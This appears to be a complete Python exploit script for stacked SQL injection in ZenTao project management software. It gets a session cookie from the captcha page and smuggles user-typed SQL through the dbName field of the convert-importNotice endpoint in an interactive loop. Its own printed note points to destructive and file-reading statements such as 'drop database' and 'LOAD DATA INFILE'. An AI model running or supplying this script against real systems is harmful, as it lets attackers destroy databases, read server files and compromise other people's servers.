import requests

url = input("Please input root url (eg. http://xxx/zentaopms/www/): ")

s = requests.session()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.42"
}

print("NOTE: stacked injection, which means you can run something like 'drop database xxx', 'LOAD DATA INFILE xxx' and so on.")
while True:
    sql = input("# ")
    data = {
        "dbName": "test'; "+sql + "# "
    }
    s.get(url+"misc-captcha-user.html")
    s.post(url+"convert-importNotice.html?zentaosid="+s.cookies['zentaosid'], headers=headers, data=data)
    s.post(url+"?m=convert&f=importNotice&zentaosid="+s.cookies['zentaosid'], headers=headers, data=data)
    print("Exec success (on echo).")
